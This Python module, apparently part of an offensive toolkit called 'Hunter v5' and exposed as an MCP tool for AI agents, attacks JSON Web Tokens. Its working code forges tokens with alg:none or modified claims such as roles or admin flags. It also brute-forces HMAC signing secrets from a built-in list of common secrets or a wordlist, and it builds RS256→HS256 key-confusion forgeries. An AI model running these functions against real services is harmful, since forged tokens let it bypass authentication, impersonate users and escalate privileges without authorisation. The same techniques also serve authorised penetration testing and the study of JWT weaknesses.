"""
Hunter v5 — JWT Tool

JWT token analysis, forgery, and cracking:
1. Decode header/payload
2. Detect alg:none vulnerability
3. Forge tokens with modified claims
4. Crack HMAC secrets via wordlist
5. Key confusion attack (RS256→HS256)
"""

import base64
import hashlib
import hmac
import json
import time
import os
from typing import Optional


def _b64_decode(s: str) -> str:
    """Decode base64url."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")


def _b64_encode(data: bytes) -> str:
    """Encode to base64url (no padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple:
    """Parse JWT into header, payload, signature."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None, None, None, "Invalid JWT format (expected 3 parts)"

    try:
        header = json.loads(_b64_decode(parts[0]))
    except Exception as e:
        header = {"_raw": parts[0], "_error": str(e)}

    try:
        payload = json.loads(_b64_decode(parts[1]))
    except Exception as e:
        payload = {"_raw": parts[1], "_error": str(e)}

    signature = parts[2]
    return header, payload, signature, None


def _create_jwt(header: dict, payload: dict, secret: str = "") -> str:
    """Create a JWT token."""
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{h}.{p}"

    alg = header.get("alg", "none")

    if alg == "none":
        sig = ""
    elif alg.startswith("HS"):
        sig = _b64_encode(hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest())
    else:
        sig = ""

    return f"{message}.{sig}"


def jwt_decode(token: str) -> dict:
    """Decode and analyze a JWT token."""
    header, payload, signature, error = _parse_jwt(token)
    if error:
        return {"error": error}

    parts = token.split(".")
    analysis = {
        "header": header,
        "payload": payload,
        "signature": signature,
        "raw": {
            "header": parts[0],
            "payload": parts[1],
            "signature": parts[2],
        },
    }

    # Detect vulnerabilities
    vulns = []

    # Check alg:none
    if header.get("alg", "").lower() == "none":
        vulns.append({
            "type": "alg_none",
            "severity": "critical",
            "detail": "Algorithm is 'none' - token can be forged without a key",
        })

    # Check weak algorithms
    weak_algs = ["HS256", "HS384", "HS512"]
    if header.get("alg") in weak_algs:
        vulns.append({
            "type": "hmac_algorithm",
            "severity": "info",
            "detail": f"Uses {header['alg']} (HMAC) - susceptible to brute-force if secret is weak",
        })

    # Check for common claims
    claims = []
    for claim in ["sub", "iss", "aud", "exp", "iat", "nbf", "jti", "role", "admin", "user"]:
        if claim in payload:
            claims.append(claim)

    analysis["vulnerabilities"] = vulns
    analysis["claims"] = claims

    # Check expiration
    if "exp" in payload:
        import datetime
        try:
            exp_time = datetime.datetime.fromtimestamp(payload["exp"])
            analysis["expires"] = exp_time.isoformat()
            if exp_time < datetime.datetime.now():
                analysis["expired"] = True
                vulns.append({
                    "type": "expired_token",
                    "severity": "info",
                    "detail": "Token has expired",
                })
        except Exception:
            pass

    return analysis


def jwt_forge(token: str, modifications: dict = None,
              set_alg_none: bool = False, secret: str = "") -> dict:
    """Forge a JWT token with modified claims."""
    header, payload, _, error = _parse_jwt(token)
    if error:
        return {"error": error}

    # Apply modifications
    if set_alg_none:
        header["alg"] = "none"
        header.pop("typ", None)  # Some servers reject typ with none

    if modifications:
        payload.update(modifications)

    # Create forged token
    forged = _create_jwt(header, payload, secret)

    return {
        "original": token,
        "forged": forged,
        "header": header,
        "payload": payload,
        "technique": "alg:none" if set_alg_none else "claim_modification",
    }


def jwt_crack(token: str, wordlist: str = "") -> dict:
    """Crack HMAC secret via wordlist brute-force."""
    header, payload, signature, error = _parse_jwt(token)
    if error:
        return {"error": error}

    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return {"error": f"Algorithm {alg} is not HMAC-based, cannot brute-force"}

    parts = token.split(".")
    message = f"{parts[0]}.{parts[1]}".encode()
    target_sig = base64.urlsafe_b64decode(parts[2] + "==")

    # Hash function mapping
    hash_funcs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_func = hash_funcs.get(alg, hashlib.sha256)

    # Default wordlist (common JWT secrets)
    if not wordlist:
        common_secrets = [
            "secret", "password", "123456", "admin", "key", "jwt",
            "token", "test", "changeme", "default", "supersecret",
            "mysecret", "jwt_secret", "jwt-secret", "secretkey",
            "your-256-bit-secret", "your-secret-key", "shhh",
        ]
        words = common_secrets
    else:
        # Load wordlist from file
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                words = [line.strip() for line in f if line.strip()]
        except Exception as e:
            return {"error": f"Failed to load wordlist: {e}"}

    start = time.time()
    tested = 0

    for word in words:
        tested += 1
        mac = hmac.new(word.encode(), message, hash_func).digest()
        if mac == target_sig:
            elapsed = time.time() - start
            return {
                "cracked": True,
                "secret": word,
                "algorithm": alg,
                "tested": tested,
                "elapsed_ms": int(elapsed * 1000),
                "forged_with_secret": _create_jwt(header, payload, word),
            }

    elapsed = time.time() - start
    return {
        "cracked": False,
        "algorithm": alg,
        "tested": tested,
        "elapsed_ms": int(elapsed * 1000),
        "hint": "Try a larger wordlist (e.g. rockyou.txt)",
    }


def jwt_key_confusion(token: str, public_key: str = "") -> dict:
    """Test key confusion attack (RS256→HS256)."""
    header, payload, _, error = _parse_jwt(token)
    if error:
        return {"error": error}

    if header.get("alg") != "RS256":
        return {"error": f"Key confusion only works on RS256, got {header.get('alg')}"}

    # Modify header to use HS256
    header["alg"] = "HS256"

    if public_key:
        # Use the RSA public key as HMAC secret
        forged = _create_jwt(header, payload, public_key)
        return {
            "attack": "key_confusion",
            "technique": "RS256→HS256 with public key as HMAC secret",
            "forged": forged,
            "note": "If server uses same key for verification, this will work",
        }
    else:
        return {
            "attack": "key_confusion",
            "technique": "RS256→HS256",
            "note": "Provide the RSA public key to generate forged token",
            "forged_header": header,
        }


def jwt_tool_impl(action: str = "decode", token: str = "",
                   modifications: dict = None, set_alg_none: bool = False,
                   secret: str = "", wordlist: str = "",
                   public_key: str = "") -> dict:
    """JWT tool entry point for MCP."""
    if action == "decode":
        return jwt_decode(token)
    elif action == "forge":
        return jwt_forge(token, modifications, set_alg_none, secret)
    elif action == "crack":
        return jwt_crack(token, wordlist)
    elif action == "key_confusion":
        return jwt_key_confusion(token, public_key)
    else:
        return {"error": f"Unknown action: {action}. Use: decode, forge, crack, key_confusion"}
